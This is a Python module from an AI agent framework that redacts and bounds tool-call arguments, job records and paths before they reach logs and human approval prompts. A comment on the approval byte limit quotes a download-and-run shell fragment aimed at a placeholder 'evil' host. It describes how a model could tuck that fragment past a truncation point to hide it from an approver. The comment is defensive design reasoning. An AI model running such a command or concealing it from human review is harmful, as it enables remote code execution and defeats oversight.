from __future__ import annotations

import json
from collections.abc import Callable, Mapping
from typing import Any

from jsonschema import Draft202012Validator

from monoid_agent_kernel.core.schemas import (
    JOB_SCHEMA,
    PUBLIC_JOB_SCHEMA,
    PUBLIC_JOB_SCHEMA_VERSION,
)
from monoid_agent_kernel.errors import WorkspaceError
from monoid_agent_kernel.permissions import PermissionPolicy
from monoid_agent_kernel.web import public_query_preview, public_url_preview

REDACTED_PATH = "[redacted-path]"


def public_path(path: str, policy: PermissionPolicy) -> str:
    """The publishable form of one path — redacted by pattern, and fail-closed on a bad one.

    Goes through ``_is_path_redacted`` rather than ``policy.is_path_redacted`` directly. The raw
    predicate normalizes before matching and *raises* on an absolute path or a ``..`` traversal,
    both of which a model can put in a ``path`` argument, and every caller of this function sits on
    an event-construction path. So the raise did not produce a failed tool observation the model
    could correct — it escaped ``_emit_tool_started`` before validation, and the error handler
    retried the same emission, ending the run of any operator who had configured
    ``redact_patterns``.

    Guarding here rather than at a call site is the point. Fourteen call sites share this function
    and its ``public_inline_path`` wrapper — ten across ``loop``, ``loop_phases``, ``tasks``,
    ``tool_services.shell`` and ``core.projections``, and four inside this module (one of which is
    ``public_inline_path`` itself) — and a review found one of them. Fixing that one would have left
    thirteen and made a third implementation of a rule that already existed in two places, which is
    how the defect was reachable at all: the guard was added to ``preview_value``'s path branch and
    not to its twin here. Two commits were spent correcting this count and both were wrong; it is
    now what ``ast`` reports, not what was counted by eye.
    """
    return REDACTED_PATH if _is_path_redacted(path, policy) else path


def public_inline_path(path: str, policy: PermissionPolicy) -> str:
    """A path for a *log* field a renderer prints inline: redacted, bounded, and marked when cut.

    The distinction this draws is the one the release keeps rediscovering. ``public_path`` alone is
    for **contract** surfaces — ``proposal.json``'s ``changed_paths`` and ``snapshot_path`` are
    resolved back to real files by ``core.proposal_file``, ``core.packages`` and ``core.schemas``,
    so a truncated value there does not describe a shorter path, it breaks replay and packaging.
    This one is used by exactly three fields: ``tool.call.started.paths`` and
    ``workspace.file.changed``'s ``paths`` and ``result.path``. Not ``artifact.emitted.path``,
    which looks like a member of this family and is not — ``emit_artifact_bytes`` rewrites it to
    ``artifacts/<id>/<basename>``, so it is a run-dir pointer readers resolve, and it stays raw.

    **The partition above is a rationale, not a description of every call site.** ``changed_paths``
    on ``turn.settled``, ``proposal.ready``, ``workspace.diff.updated`` and ``metrics.json`` are log
    surfaces by that reasoning and use bare ``public_path``, so the same 243-byte path goes out cut
    in ``paths`` and whole beside it. They are left exact deliberately: they are the same list
    ``proposal.json`` publishes, redaction is the property that matters for them, and paths are
    listed as carried in ``docs/OBSERVABILITY.md`` — a length cap there buys little and splitting one
    list across two treatments has already produced defects twice in this release.

    It exists because those three were three different answers. ``paths`` got the cap and the
    marker; ``artifact.emitted.path`` got neither, four lines under a comment about closing "the
    second emit the wider door"; and ``public_result_content`` diverted ``path`` to bare
    ``public_path``, so one ``workspace.file.changed`` carried the same argument cut-and-marked in
    ``paths`` and whole in ``result.path`` — the cap defeated by the field beside it, which is also
    how the ``source_path`` redaction gap worked.
    """
    return truncate_inline_text(
        public_path(path, policy),
        threshold=PREVIEW_BYTE_THRESHOLD,
        budget=PREVIEW_BYTE_BUDGET,
    )


def public_identifier(value: str) -> str:
    """An identifier for publication, bounded.

    Named for what it is rather than for the first field that needed it. An identifier field looks
    kernel-controlled and generally is not: `_aexecute_tool_call` handles a `call_name` the catalog
    cannot resolve and still emits it (36 KB, measured, across `tool.call.started` and
    `tool.call.failed`); `response_id` and `previous_turn_handle` are echoed from the gateway, i.e.
    from outside the trust boundary; and a `job_id` is whatever the model asked about.

    "That field is an identifier" is the same assumption that left dict keys, env keys and the tool
    name unbounded, three separate times in this release.
    """
    return truncate_inline_text(value, threshold=PREVIEW_BYTE_THRESHOLD, budget=PREVIEW_BYTE_BUDGET)


def public_error_message(error: str) -> str:
    if not error:
        return ""
    if "PRIVATE KEY" in error.upper():
        return "[redacted-sensitive-error]"
    return error


def public_result_content(content: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    payload_budget = PayloadBudget(TRACE_PAYLOAD_BYTE_BUDGET)

    def one(key: str, value: Any) -> Any:
        # Both branches below skip `preview_value`, so they charge themselves; `_charge_fragment`
        # returns the `_DROPPED` sentinel `public_mapping` already stops on.
        if key == "content":
            return _charge_fragment(payload_budget, redacted_value(value))
        if key == "path" and isinstance(value, str):
            # Same bound as `paths` on the event that carries this. Diverting `path` to bare
            # `public_path` published the model's whole argument beside its own truncation.
            return _charge_fragment(payload_budget, public_inline_path(value, policy))
        return preview_value(key, value, policy, _payload_budget=payload_budget)

    return public_mapping(content, one, payload_budget=payload_budget)


def public_capability_result(result: Mapping[str, Any]) -> dict[str, Any]:
    """Return the public view of a capability task result.

    The private task result may carry raw grant material used by the loop to admit a lease.
    Public surfaces only get non-secret lease descriptors and denial state.
    """

    lease = result.get("lease") if isinstance(result.get("lease"), Mapping) else None
    granted = result.get("granted") is True or result.get("approved") is True
    if lease is not None and granted:
        public: dict[str, Any] = {"status": "granted"}
        for key in ("capability", "lease_id", "expires_at"):
            if key in lease:
                public[key] = lease[key]
        if isinstance(lease.get("scope"), Mapping):
            public["scope"] = dict(lease["scope"])
        if result.get("reason"):
            public["reason"] = str(result.get("reason"))
        return public

    public = {"status": "denied", "reason": str(result.get("reason") or "denied")}
    capability = result.get("capability")
    if capability is None and lease is not None:
        capability = lease.get("capability")
    if capability:
        public["capability"] = str(capability)
    return public


def public_proposal_payload(payload: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    files = [file for file in payload.get("files", []) if isinstance(file, dict)]
    return {
        "path": "proposal.json",
        "mode": payload.get("mode"),
        "proposal_hash": payload.get("proposal_hash"),
        "diff_path": payload.get("diff_path"),
        "diff_bytes": payload.get("diff_bytes"),
        "diff_sha256": payload.get("diff_sha256"),
        "changed_paths": [public_path(str(path), policy) for path in payload.get("changed_paths", [])],
        "files": [public_proposal_file(file, policy) for file in files],
    }


def public_proposal_file(file: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    path = str(file.get("path", ""))
    # The guarded predicate, for the same reason `public_path` uses it — and because after that
    # change this function was calling both: line 101 failed closed while this line still raised on
    # the identical string. Proposal paths come from the workspace diff rather than from a model
    # argument, so this is harder to reach than the tool-call sites, but "that input is always
    # well-formed" is exactly the assumption that made the other two reachable.
    redacted = _is_path_redacted(path, policy)
    return {
        "path": public_path(path, policy),
        "kind": file.get("kind"),
        "size": file.get("size"),
        "sha256": file.get("sha256"),
        "base_sha256": file.get("base_sha256"),
        "proposed_sha256": file.get("proposed_sha256"),
        "snapshot_sha256": file.get("snapshot_sha256"),
        "change_kind": file.get("change_kind"),
        "snapshot_path": REDACTED_PATH if redacted else file.get("snapshot_path"),
    }


_JOB_ARTIFACT_VALIDATOR = Draft202012Validator(JOB_SCHEMA)
_PUBLIC_JOB_VALIDATOR = Draft202012Validator(PUBLIC_JOB_SCHEMA)
_REDACTED_JOB_ERROR = "[redacted-job-error]"

# Values whose artifact schema already constrains them to bounded enums, numbers, booleans, or a
# stable identifier. Every string that can contain prose or a path is handled explicitly below.
_JOB_COPIED_KEYS = frozenset(
    {
        "job_id",
        "status",
        "started_at",
        "finished_at",
        "duration_s",
        "exit_code",
        "timed_out",
        "output_truncated",
        "stdout_bytes",
        "stderr_bytes",
        "requested_timeout_s",
        "effective_timeout_s",
        "requested_max_output_bytes",
        "effective_max_output_bytes",
        "requested_startup_wait_s",
        "effective_startup_wait_s",
        "execution_workspace",
        "resume_on_exit",
    }
)


def public_job_artifact(job: Mapping[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """The publishable form of one ``artifacts/jobs/<id>/job.json``. One function, every reader.

    It was three, across six call sites, and only one of them was right. ``BackgroundJob.to_json``
    is written to disk raw and then re-read by ``monoid jobs --json``, ``monoid job status --json``,
    the reference backend's ``/v1/runs/<id>/jobs`` and Studio's ``/api/jobs``, each of which
    published ``command``, ``cwd`` and ``changed_paths`` verbatim; ``core.projections`` had a fourth
    answer that dropped ``command`` and redacted ``changed_paths`` but left ``cwd`` exact. The one
    correct projection reached only the event sink -- so **backgrounding a command was enough to
    route around** ``redact_patterns``, which is the same sentence a comment in ``tasks`` already
    used about the event path when that half was fixed and this half was not.

    ``job.json`` does not get ``task.json``'s "private by location" exemption: it is served over
    HTTP by two surfaces. See ``docs/OBSERVABILITY.md``.

    The durable input is validated before projection, and the output is built from an explicit
    allowlist and validated against ``PUBLIC_JOB_SCHEMA``. A retained or tampered artifact cannot
    invent a field and have a public reader copy it through.

    Deliberately outside the payload budget: the field set is a fixed allowlist, every previewed
    field is individually bounded, and both ends are schema-validated -- the total is structurally
    bounded without an accountant. (``cwd``'s lone ``preview_value`` call self-creates a budget,
    which for a single scalar is the same thing as none.)

    The fields receive these treatments:

    - ``command`` is dropped outright. ``command_preview`` is already in the artifact and is built
      by ``shell.preview_command``, so a reader loses no field, only the unbounded copy of it.
    - ``cwd`` and the log paths are previewed because they are paths.
    - ``changed_paths`` is redacted but **not** truncated: it is the declared-contract family that
      ``proposal.json`` publishes and ``core.packages`` resolves back to real files, and a shortened
      path there does not name a shorter file, it breaks replay.
    - ``error`` is bounded when no path redaction policy exists. With any redaction policy it is
      replaced as a unit: shell scan failures interpolate a path that need not appear in
      ``changed_paths``, so substring guessing would fail open.

    The public object has its own ``monoid.public-background-job.v1`` discriminator. The original
    durable version remains in ``artifact_schema_version``; labeling a shape without required
    ``command`` as ``background-job.v1`` made it invalid against the schema named on the object.
    """
    artifact = dict(job)
    try:
        artifact_error = next(_JOB_ARTIFACT_VALIDATOR.iter_errors(artifact), None)
    except RecursionError:
        artifact_error = True
    if artifact_error is not None:
        raise ValueError("job artifact does not match monoid.background-job.v1")

    public: dict[str, Any] = {
        "schema_version": PUBLIC_JOB_SCHEMA_VERSION,
        "artifact_schema_version": artifact["schema_version"],
    }
    public.update({key: artifact[key] for key in _JOB_COPIED_KEYS if key in artifact})
    if "kind" in artifact:
        public["kind"] = public_identifier(str(artifact["kind"]))
    public["command_preview"] = truncate_inline_text(
        str(artifact["command_preview"]), threshold=PREVIEW_BYTE_THRESHOLD, budget=200
    )
    public["cwd"] = preview_value("cwd", artifact["cwd"], policy)
    for key in ("stdout_path", "stderr_path"):
        public[key] = public_inline_path(str(artifact[key]), policy)
    if "changed_paths" in artifact:
        public["changed_paths"] = [public_path(path, policy) for path in artifact["changed_paths"]]
    if "error" in artifact:
        error = str(artifact["error"])
        public["error"] = (
            _REDACTED_JOB_ERROR
            if error and policy.redact_patterns
            else truncate_inline_text(
                public_error_message(error),
                threshold=PREVIEW_BYTE_THRESHOLD,
                budget=PREVIEW_BYTE_BUDGET,
            )
        )

    try:
        projection_error = next(_PUBLIC_JOB_VALIDATOR.iter_errors(public), None)
    except RecursionError:
        projection_error = True
    if projection_error is not None:
        raise ValueError("public job projection does not match monoid.public-background-job.v1")
    return public


def args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """The generic trace preview: caps and content-field redaction, and **no secret-name guessing**.

    Deliberately asymmetric with ``core.tool_approval.redact_tool_arguments``, which does mask
    secret-*named* keys. That is not an oversight to bind: ``0109e06`` removed "unconfigurable
    key-name/value guessing" from this module on purpose and made secret redaction beyond content
    fields the integrating backend's job through the ``EventSink`` seam
    (``examples/redacting_event_sink.py``, pinned by ``tests/test_observability.py``). The approval
    record is a different artifact -- a human acts on it directly -- so it masks.

    The consequence is real and worth stating rather than implying otherwise: an ``api_key`` argument
    is masked on an ``ask``-gated call and published verbatim on an ``allow`` call. Anyone who wants
    it masked on both adds the example sink, or does not pass credentials as tool arguments.
    """
    payload_budget = PayloadBudget(TRACE_PAYLOAD_BYTE_BUDGET)
    return public_mapping(
        arguments,
        lambda key, value: preview_value(key, value, policy, _payload_budget=payload_budget),
        payload_budget=payload_budget,
    )


# ``run.finish`` arguments that are the model's own prose rather than metadata about the run.
# ``outputs`` is a path list and stays previewed normally.
_FINISH_CONTENT_KEYS = frozenset({"summary", "notes"})


def finish_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """Preview for ``run.finish``, whose ``summary`` is the run's final answer.

    Settling through ``run.finish`` is the default flow, so this argument *is* the model-authored
    final text — the same value that reaches ``turn.settled``. Left to the generic preview it was
    copied verbatim into ``tool.call.started.data.args_preview`` (and truncated to a 160-*byte*
    prefix when long), putting model output on `events.jsonl` and every event sink through a
    second door. Removing it from the settle events alone would not have closed the channel.

    Kept out of ``_is_content_field``: that predicate is documented as *file*-content fields, and
    these are model content. Same destination, different reason.

    ``summary`` and ``notes`` are treated alike here but recover differently, which is deliberate.
    ``summary`` becomes ``state.final_text``, so it is written to the run-dir settled-text record
    and hydrated back for entitled readers. ``notes`` has no such route — it is redacted at both
    public seams that carry it (here, and ``arguments_preview`` on the approval request; see
    ``core.tool_approval``) and survives only in ``transcript.jsonl``'s private ``model_turn``
    record. That is the intended destination for model prose; it is not a join-back path, and
    nothing should be built expecting one.

    ``None`` is left alone rather than redacted: ``notes`` is declared ``["string", "null"]``, and
    a redaction marker on an absent value tells an operator something was withheld when nothing
    was there.
    """
    payload_budget = PayloadBudget(TRACE_PAYLOAD_BYTE_BUDGET)
    return public_mapping(
        arguments,
        lambda key, value: (
            # Charged, because this branch skips `preview_value` and the match is
            # *case-insensitive*: a mapping holds every case variant of `summary` and `notes` as a
            # distinct key, so 160 of them take this path in one payload. Uncharged, that published
            # 7,664 bytes nobody paid for and put the payload 6,575 past the ceiling -- reachable,
            # because `tool.call.started` is emitted before `validate_args` rejects the call.
            _charge_fragment(payload_budget, redacted_value(value))
            if value is not None and key.lower() in _FINISH_CONTENT_KEYS
            else preview_value(key, value, policy, _payload_budget=payload_budget)
        ),
        payload_budget=payload_budget,
    )


def shell_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    env = arguments.get("env") if isinstance(arguments.get("env"), dict) else {}
    # One budget across all seven fields, even though the outer keys are kernel literals. The
    # values are model-controlled, and any of them can arrive as a *container* -- so per-field
    # budgets here would be the reverted per-top-level-key accounting wearing builder clothes.
    payload_budget = PayloadBudget(TRACE_PAYLOAD_BYTE_BUDGET)
    payload_budget.charge(2)  # the braces, as `public_mapping` charges its own
    return {
        "command_preview": _budgeted_field(
            "command_preview", str(arguments.get("command") or ""), policy, payload_budget
        ),
        "cwd": _budgeted_field("cwd", arguments.get("cwd", "."), policy, payload_budget),
        # Previewed, not copied, even though all three are declared `["integer", "null"]`. The
        # schema does not protect this surface: `tool.call.started` is emitted *before*
        # `validate_args` rejects the call, so a model that sends a 2 KB string in `timeout_s`
        # publishes it and is then told the call was invalid. "It is an int" is the same assumption
        # that left `env_keys` and the tool name unbounded.
        "timeout_s": _budgeted_field("timeout_s", arguments.get("timeout_s"), policy, payload_budget),
        "max_output_bytes": _budgeted_field(
            "max_output_bytes", arguments.get("max_output_bytes"), policy, payload_budget
        ),
        "startup_wait_s": _budgeted_field(
            "startup_wait_s", arguments.get("startup_wait_s"), policy, payload_budget
        ),
        # Bounded by construction -- ``bool`` returns one of two values -- and charged anyway, so
        # the invariant reads "every field this builder appends is charged" with no footnote about
        # which ones were exempt. Five charged bytes buys a rule a census can check.
        "background": _budgeted_field(
            "background", bool(arguments.get("background", False)), policy, payload_budget
        ),
        "resume_on_exit": _budgeted_field(
            "resume_on_exit", bool(arguments.get("resume_on_exit", True)), policy, payload_budget
        ),
        # Previewed, not copied. Env *keys* are model-controlled strings of unbounded length and
        # count: a 20 KB key rode out verbatim here while the same value in a generic argument was
        # capped. This branch withholds env *values* on purpose, so letting the keys carry arbitrary
        # text made it a way to publish exactly what it was withholding.
        "env_keys": _budgeted_field(
            "env_keys", sorted(str(key) for key in env), policy, payload_budget
        ),
    }


def web_args_preview(arguments: dict[str, Any], policy: PermissionPolicy) -> dict[str, Any]:
    """Preview for the web tools, which withhold the query and URL and publish only descriptors.

    Every descriptor below is previewed rather than copied. They are model-controlled strings, and
    copying them raw made this branch a way to publish the very text it exists to withhold: a
    ``locale`` or a ``blocked_domains`` entry carrying 20 KB rode out verbatim in the same event
    whose ``query_preview`` was reduced to a digest. Bypassing the cap is not free just because the
    field sounds like an enum.
    """
    preview: dict[str, Any] = {}
    # Same rule as ``shell_args_preview``: kernel-literal keys, model-controlled values, one
    # budget across all of them so a container in any field cannot start a fresh allowance.
    payload_budget = PayloadBudget(TRACE_PAYLOAD_BYTE_BUDGET)
    payload_budget.charge(2)  # the braces, as `public_mapping` charges its own
    if "query" in arguments:
        preview["query_preview"] = _budgeted_field(
            "query_preview", public_query_preview(str(arguments.get("query") or "")), policy, payload_budget
        )
    if "url" in arguments:
        # The descriptor is a digest everywhere except its ``scheme`` and ``domain``, which are
        # lifted out of the URL verbatim -- and a hostname is valid at any length, so is a scheme.
        # Appending this fragment raw let a 4 MB hostname publish a 4 MB ``args_preview`` past a
        # ceiling this same function declares. The web service's own ``.finished``/``.failed``
        # events carry the identical fragment through ``public_event_payload``, which bounds it,
        # so the two surfaces of one call disagreed by four megabytes until this route matched.
        preview["url_preview"] = _budgeted_field(
            "url_preview", public_url_preview(str(arguments.get("url") or "")), policy, payload_budget
        )
    for key in (
        "max_results",
        "max_tokens",
        "max_urls",
        "max_snippets",
        "timeout_s",
        "max_bytes",
        "recency_days",
        "locale",
        "format",
    ):
        if key in arguments:
            preview[key] = _budgeted_field(key, arguments[key], policy, payload_budget)
    if "allowed_domains" in arguments:
        preview["allowed_domains"] = _budgeted_field(
            "allowed_domains", arguments.get("allowed_domains") or [], policy, payload_budget
        )
    if "blocked_domains" in arguments:
        preview["blocked_domains"] = _budgeted_field(
            "blocked_domains", arguments.get("blocked_domains") or [], policy, payload_budget
        )
    return preview


# A preview is capped so that a bounded amount of text reaches the event stream, and "bounded" is a
# byte budget — that is what an event log costs and what an operator's redaction promise is about.
# Slicing by *characters* against a *byte* threshold made the cap depend on the language: 100 Hangul
# characters are 300 bytes, so they cleared the 240-byte threshold and were then "truncated" to a
# 160-character prefix, i.e. to all 100 of them. Every multibyte string with at most 160 characters
# and more than 240 bytes was published in full while the payload reported ``truncated: True``.
PREVIEW_BYTE_THRESHOLD = 240
PREVIEW_BYTE_BUDGET = 160
# Bounds on the recursion itself. Nested containers arrive from model-controlled input --
# ``artifact.emit.metadata`` and ``run.update_plan.items`` both declare ``additionalProperties:
# True`` -- so without these a model can hand the writer a structure that costs more to preview than
# the run is worth, or one deep enough to raise ``RecursionError`` inside tool dispatch. The read
# side already learned the depth lesson (``core.schemas`` catches ``RecursionError``); this is the
# write side learning it.
PREVIEW_MAX_DEPTH = 8
PREVIEW_MAX_KEYS = 20
PREVIEW_MAX_ITEMS = 20

# The *decision* surface's budget. An approval preview is read by a person deciding whether to let a
# call run, not by a log reader, and the two want opposite things from a cap. Measured on the trace
# budget: a 341-byte `shell.exec` command was cut at 160 bytes, so `&& curl http://evil/x | sh`
# reached no surface the approver could see -- with the model choosing where in the string to put it.
# That is a strictly worse trade than the egress it buys, because a whole *file body* (the leak this
# release exists to close) is redacted outright by `_is_content_field` regardless of this number.
# So: big enough for any realistic command or argument, still bounded against a pathological one.
APPROVAL_BYTE_THRESHOLD = 4096
APPROVAL_BYTE_BUDGET = 4096

# The *payload* ceiling. Every cap above bounds one piece — a value's bytes, a container's width,
# the recursion's depth — and none of them bounds the sum, which left two measured routes open: a
# mapping shared five ways across nine levels (46 objects, an input that fits on a line) previewed
# to 25.78 MB in 1.02 s, because sharing is not a cycle and re-expansion is once per path; and a
# payload chunked into cap-obeying pieces published all of them, 95 KB per event with nothing
# bounding the piece count. The budget is bytes of *output* rather than visited nodes: the reverted
# ``PREVIEW_MAX_NODES`` proved a node is not a byte (counting only containers left 912 KB of
# markers outside the count), and it was born once per top-level key, so 400 keys still cost 42 MB.
# One ``PayloadBudget`` per payload, threaded through the whole traversal, charged on everything
# appended — keys, values and truncation markers alike.
#
# Two constants because the two surfaces read differently: a log reader gets the trace ceiling,
# far above anything the per-value caps admit in ordinary shapes (the worst cap-obeying flat
# payload measures ~95 KB), and the approval card — a person deciding whether a call may run —
# gets a ceiling a human could conceivably scroll. Letting the trace constant reach the decision
# surface is the same inversion ``decision_surface`` exists to prevent.
TRACE_PAYLOAD_BYTE_BUDGET = 256 * 1024
APPROVAL_PAYLOAD_BYTE_BUDGET = 1024 * 1024
# Headroom the terminal truncation markers spend from, so "the cut announces itself" survives the
# moment the budget runs out. Bounded by construction: past exhaustion, at most one marker lands
# per container still open on the recursion stack — the depth cap keeps that under two dozen.
_PAYLOAD_MARKER_RESERVE = 1024


class PayloadBudget:
    """What one payload may still append, in serialized UTF-8 bytes.

    ``charge`` is the ordinary spend: refuse-without-deducting when the fragment does not fit, so
    the caller drops that fragment and reports the drop. ``charge_marker`` is for the report
    itself — a truncation marker must land even at zero, or the cut becomes silent, so it spends
    into the reserve carved out at construction. The serialized payload can exceed neither half:
    regular fragments fit inside ``limit - reserve``, and what spends from the reserve after
    exhaustion is bounded by construction — at most one announcement per container still open on
    the recursion stack, which the depth cap holds under two dozen, plus one per fixed field of a
    hand-assembled builder. "The stack depth bounds it" was the wrong reason on its own:
    ``_budgeted_field`` adds a field-bounded term the stack knows nothing about. Measured at the
    worst shape either route reaches: 17 announcements, 489 bytes, against a 1024-byte reserve.
    """

    __slots__ = ("remaining",)

    def __init__(self, limit: int) -> None:
        self.remaining = max(limit - _PAYLOAD_MARKER_RESERVE, 0)

    def charge(self, cost: int) -> bool:
        if cost > self.remaining:
            return False
        self.remaining -= cost
        return True

    def charge_marker(self, cost: int) -> None:
        self.remaining -= cost


class _Dropped:
    """Sentinel: the budget refused this fragment; the enclosing container stops and reports."""

    def __repr__(self) -> str:  # pragma: no cover - debugging aid
        return "DROPPED"


_DROPPED = _Dropped()


def _fragment_cost(fragment: Any) -> int:
    """Serialized size of one finished fragment, measured the way the *widest* sink spells it.

    Two axes, and both must be the widest or the budget bounds a representation no reader
    receives. Separators: default, which the event log writes and the compact sinks undercut.
    Escaping: ``ensure_ascii=True``, because ``EventSubscriptionFrame.to_sse`` and Studio's
    ``_sse_send`` escape on purpose — U+2028, U+2029 and U+0085 survive an unescaped dump and
    split an SSE frame mid-string for ``str.splitlines`` readers — and an escaped BMP character
    costs six bytes however few it takes in UTF-8. Counting UTF-8 here let a payload charged just
    inside 256 KiB arrive at 503,579 bytes out of the real frame writer, and near three times the
    ceiling for two-byte scripts and non-BMP codepoints: the same defect this module was
    corrected for once already, one level up — a bound measured in a representation the wire does
    not use.

    What this dominates, exactly: every writer that spells a payload onto a stream or a log line
    — ``events.jsonl``, both SSE frame writers, the HTTP JSON bodies — because Studio's
    ``_sse_send`` *is* this spelling and the rest undercut it on one axis or the other. It does
    not dominate ``write_json_atomic``, which pretty-prints ``status.json`` and the approval
    package files with ``indent=2``: per-element indentation is a third axis, measured at 2.65x
    the charge for a payload of many tiny elements. That is left as a stated reach rather than a
    charged axis for two reasons — the indent cost depends on how deeply the payload is nested
    inside its file, which is the writer's business and not knowable here, and indentation is a
    bounded multiple of a bounded payload rather than the unbounded growth this budget exists to
    stop. The claim is a ceiling on what a subscriber receives, not on what a pretty-printer
    writes to the operator's disk.

    Escaped output is ASCII, so its character count is its byte count. The scalar tail envelopes
    everything portable JSON cannot spell before it gets here, so the ``-1`` escape survives only
    for what a caller-supplied ``mask`` returns: that contract is the caller's, and an
    unencodable replacement keeps today's behaviour (through, uncharged) rather than acquiring a
    spelling this module invented for it.
    """
    try:
        return len(json.dumps(fragment))
    except (TypeError, ValueError):
        return -1


def _charge_fragment(budget: PayloadBudget, fragment: Any) -> Any:
    cost = _fragment_cost(fragment)
    if cost < 0:
        return fragment
    return fragment if budget.charge(cost) else _DROPPED


def _spend_terminal(budget: PayloadBudget, cost: int) -> None:
    """Spend bytes that have to land whatever the budget says: charged like any fragment while
    money remains, and to the reserve once it does not.

    Three kinds of byte qualify, and they are exactly the ones a caller cannot drop — a truncation
    marker (the cut has to say it happened), the ``#N`` that keeps a source key alive beside a
    marker of the same name, and a hand-assembled builder's kernel-literal key, which a reader
    looks up by name.
    """
    if not budget.charge(cost):
        budget.charge_marker(cost)


def _charge_terminal_marker(budget: PayloadBudget, fragment: Any) -> None:
    """A truncation marker is charged like any fragment while money remains, and to the reserve
    once it does not — the marker landing is what keeps the cut visible."""
    cost = _fragment_cost(fragment)
    if cost < 0:  # pragma: no cover - markers are kernel-built JSON
        return
    _spend_terminal(budget, cost)


def _int_spelling_exceeds(value: int, threshold: int) -> bool:
    """Whether the integer's JSON spelling (sign included) is longer than ``threshold`` bytes.

    Never spells the value to find out: ``str()`` on an integer past the interpreter's digit
    limit is exactly the crash this branch exists to keep out of event construction. Magnitude
    comparison against a power of ten is the same question asked without the conversion —
    ``digits(|v|) > d  iff  |v| >= 10**d`` — with one budgeted byte fewer for a negative sign.
    The fast path skips building ``10**threshold`` for the ints real payloads carry.

    Through ``int.__index__`` first, for the reason ``_int_hex_preview`` states two functions
    down and this one did not: the threshold is about what a writer will spell, and ``json.dumps``
    spells an ``int`` subclass by its base value, so ``<`` and unary ``-`` must not be handed to
    the subclass. This site is the worse of the pair — it runs *inside event construction*, where
    a raise from a model-supplied object ends the run (see ``_is_path_redacted`` below for the
    same hazard), and it is reachable past the refusing boundaries: ``update_plan`` normalizes
    with the default ``refuse_unportable_scalars=False``, and a subclass that answers the ingress
    honestly can still detonate on this negation.
    """
    numeric = int.__index__(value)
    magnitude = -numeric if numeric < 0 else numeric
    digit_budget = threshold - 1 if numeric < 0 else threshold
    if digit_budget >= 18 and magnitude < 10**17:
        return False
    return magnitude >= 10**digit_budget


def _int_hex_preview(value: int, budget: int) -> str:
    """The leading hex digits of ``value``, derived without ever spelling the whole number.

    ``format(v, "#x")`` allocates a string linear in the bit length, and then all but ``budget``
    bytes of it are thrown away. That is a preview whose cost is the size of the *input* rather
    than of the output, inside event construction, on a route the refusing ingress boundaries do
    not cover — ``update_plan`` normalizes without them, so a custom tool can nest a sparse big
    integer in a plan item at almost no cost to itself. Measured on a 20 Mbit value: 10.0 MB peak
    through ``preview_value`` against 0.4 KB for this derivation, and the ratio grows with the
    input.

    Shifting away the digits that would be discarded leaves exactly the retained ones, because a
    right shift by ``4 * dropped`` removes ``dropped`` hex digits and CPython allocates only the
    result. ``int.__index__`` first, so the arithmetic runs on a true ``int`` and a subclass's
    ``__format__`` or ``bit_length`` is never consulted. The one allocation still proportional to
    the input is negating a *negative* magnitude, which copies the integer but not the far larger
    spelling; the value is already in memory, so this adds no order of growth.
    """
    numeric = int.__index__(value)
    sign = "-" if numeric < 0 else ""
    magnitude = -numeric if numeric < 0 else numeric
    keep = budget - len(sign) - 2  # the budget also pays for the sign and the "0x"
    if keep <= 0:
        return truncate_to_bytes(f"{sign}0x", budget)
    hex_digits = (magnitude.bit_length() + 3) // 4
    if hex_digits > keep:
        magnitude >>= 4 * (hex_digits - keep)
    return f"{sign}0x{format(magnitude, 'x')[:keep]}"


def _budgeted_field(key: str, value: Any, policy: PermissionPolicy, budget: PayloadBudget) -> Any:
    """One fixed-key builder field, with the refusal translated where the key must survive.

    ``shell_args_preview`` and ``web_args_preview`` assemble their outer mapping by hand, so a
    ``_DROPPED`` coming back has no container loop to stop — and their keys are kernel literals a
    reader looks up by name, so dropping the *entry* would blank a field that looks checked. The
    refused value becomes the terminal marker instead: the key stays, the cut says so, and the
    marker spends from the reserve like every other announcement of exhaustion.

    The key is charged here for the same reason ``public_mapping`` charges its own: it is appended,
    and these two builders have no traversal loop to do it for them. Left out, the two of them
    published 135 and 211 bytes nobody paid for — a fixed amount that never grew with the input,
    but enough to make "every appended byte is charged" a claim with an unwritten exception in it.
    A kernel literal cannot be dropped, so it spends like a marker rather than being refusable.
    """
    _spend_terminal(budget, _fragment_cost(key) + 4)
    fragment = preview_value(key, value, policy, _payload_budget=budget)
    if fragment is _DROPPED:
        fallback = {"truncated": True, "type": type(value).__name__}
        _charge_terminal_marker(budget, fallback)
        return fallback
    return fragment


# Keys whose value a renderer prints inline, so the preview has to stay a *string*. Replacing one
# with a `{"preview": ...}` dict renders `[object Object]` -- `WorkspaceInspector.svelte` does
# `{item.step}`, and `svelte-check` cannot catch it because `run-state.ts` casts through `unknown`.
_INLINE_TEXT_KEYS = frozenset({"step"})

# Truncation marker for those keys. A bare prefix would misreport a cut value as the whole value.
TRUNCATION_SUFFIX = "…"


def truncate_to_bytes(value: str, max_bytes: int) -> str:
    """The longest prefix of ``value`` whose UTF-8 encoding fits in ``max_bytes``.

    Backs off to a codepoint boundary. A bare ``value.encode()[:n].decode()`` raises
    ``UnicodeDecodeError`` whenever the cut lands inside a multi-byte sequence, which for non-ASCII
    text is the common case rather than the edge case. ``errors="ignore"`` drops exactly the
    trailing partial sequence and nothing else: the bytes came from encoding a valid ``str``, so the
    only ill-formed run possible is the one the slice created, and UTF-8 is self-synchronizing.

    Shared with ``shell.preview_command`` rather than reimplemented there. The two truncators had
    already drifted to different constants (240/160 here, 240/200 there) while carrying the same
    defect, so a fix applied to one would have left the other publishing whole commands.
    """
    if max_bytes <= 0:
        return ""
    encoded = value.encode("utf-8")
    if len(encoded) <= max_bytes:
        return value
    return encoded[:max_bytes].decode("utf-8", errors="ignore")


def truncate_inline_text(value: str, *, threshold: int, budget: int) -> str:
    """Bound a string that has to *stay* a string, marking it when it was cut.

    The two callers publish values a renderer prints directly — a plan `step`, and the `paths` entry
    `narration._target` falls back to when `args_preview.path` came through as a preview dict — so
    neither can carry the `{"truncated": True}` envelope that says "there was more". The marker has
    to be in the text or it does not exist.

    This is one function because it was two. `paths` truncated at the budget with no threshold and
    appended nothing, so a 5000-byte path and a different 5000-byte path sharing a prefix published
